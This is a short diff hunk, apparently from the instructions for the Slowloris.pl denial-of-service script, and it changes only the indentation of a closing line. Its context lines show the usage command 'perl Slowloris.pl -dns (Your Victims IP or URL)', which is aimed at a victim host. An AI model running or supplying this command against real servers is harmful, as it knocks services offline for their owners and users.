@@ -14,6 +14,6 @@
    4.) Type = ./Slowloris.pl
    5.) Type = perl Slowloris.pl -dns (Your Victims IP or URL) -options
    
-        And You're Ready to go
+     And You're Ready to go
         
 Fabian Schacher
